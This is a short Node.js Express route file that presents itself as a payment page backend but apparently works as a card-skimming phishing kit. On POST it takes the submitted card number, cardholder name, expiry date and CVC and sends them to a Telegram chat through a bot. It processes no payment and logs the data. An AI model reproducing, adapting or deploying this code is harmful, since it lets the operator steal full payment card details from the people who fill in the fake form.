var express = require('express');
var router = express.Router();
var path = require('path');
var api = require('../config.js')


const TeleBot = require('telebot');
const bot = new TeleBot(api.TELEGRAM_BOT_TOKEN);

/* GET home page. */
router.get('/', function(req, res, next) {
  if(req.query.value*1) {
    res.render('pay', {value: req.query.value});
  }
  else {
    res.redirect('/')
  }
});

router.post('/', function(req, res, next) {
  switch (req.body.post_type) {
    case 'getPayment':
      bot.sendMessage(api.RECIEVER_ID, `✅ New report \nCARD: ${req.body.number} \nCARDHOLDER: ${req.body.name} \nDATE: ${req.body.expiry} \nCVC: ${req.body.cvc}`);
      console.log(req.body);
      break;
    default: break;
  }
});
module.exports = router;
